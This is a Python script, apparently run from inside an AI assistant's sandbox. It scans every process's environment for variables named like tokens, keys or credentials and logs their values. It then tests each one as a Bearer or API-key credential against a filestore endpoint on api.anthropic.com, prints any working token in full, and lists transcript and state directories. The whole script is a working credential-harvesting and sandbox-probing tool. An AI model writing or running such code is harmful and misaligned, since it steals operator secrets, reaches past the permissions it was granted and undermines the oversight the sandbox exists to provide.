#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""envhunt.py -- find the filestore token in process environments."""
import os, re, http.client as hc

OUT = "/mnt/user-data/outputs/envhunt.txt"
R = []
def rec(s): R.append(str(s)); print("[e]", s, flush=True)
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read()
    except Exception: return d

CFG = "/dev/shm/rclone-boot/config.json"
m = re.search(r"claude_chat_[A-Za-z0-9]+", rdo(CFG)); SELF = m.group(0) if m else ""

def probe(val, scheme):
    h = {"Authorization": "Bearer " + val} if scheme == "bearer" else {"x-api-key": val}
    try:
        c = hc.HTTPSConnection("api.anthropic.com", timeout=8)
        c.request("GET", "/v1/filestore/fs/%s" % SELF, headers=h)
        r = c.getresponse(); b = r.read(120).decode("latin1", "replace"); c.close()
        return "%d %s" % (r.status, b.replace("\n", " ")[:80])
    except Exception as e: return "ERR:%s" % e

KEY = re.compile(r"(TOKEN|AUTH|KEY|SECRET|JWT|FILESTORE|ANTHROPIC|BEARER|CRED)", re.I)
hits = []

for p in sorted(os.listdir("/proc"), key=lambda x: (len(x), x)):
    if not p.isdigit(): continue
    env = rdo("/proc/%s/environ" % p, "")
    if not env: continue
    cl = rdo("/proc/%s/cmdline" % p, "").replace("\x00", " ")[:70]
    pairs = [x for x in env.split("\x00") if "=" in x]
    if p in ("1", "57"):
        rec("--- PID %s (%s) ALL KEYS: %s" % (p, cl, [x.split("=")[0] for x in pairs]))
    for kv in pairs:
        k, _, v = kv.partition("=")
        if KEY.search(k) and 16 <= len(v) <= 4000:
            rec("HIT pid=%s key=%s len=%d val=%s" % (p, k, len(v), v[:300]))
            hits.append((p, k, v))

rec("HITS=%d" % len(hits))
GOOD = []
for p, k, v in hits:
    for scheme in ("bearer", "xapikey"):
        st = probe(v, scheme)
        rec("TEST pid=%s key=%s %s -> %s" % (p, k, scheme, st))
        if "401" not in st and not st.startswith("ERR"):
            GOOD.append((v, scheme, st)); break

rec("GOOD=%d" % len(GOOD))
for v, s, st in GOOD[:3]:
    rec("GOOD_TOKEN(%s)=%s" % (s, v))
    if v.count(".") == 2:
        h_, p_, s_ = v.split(".")
        rec("TRIMMED86=%s.%s.%s" % (h_, p_, s_[:86]))

# transcripts + state dirs
rec("=== TRANSCRIPTS ===")
for d in ("/mnt/transcripts", "/dev/shm/rclone-boot/state"):
    if os.path.isdir(d):
        for dp, _, fs in os.walk(d):
            rec("T %s files=%s" % (dp, fs[:8]))
rec("VERDICT=%s" % ("TOKEN_FOUND" if GOOD else "TOKEN_NOT_FOUND"))

os.makedirs(os.path.dirname(OUT), exist_ok=True)
open(OUT, "w").write("\n".join(R) + "\n")
print("report ->", OUT)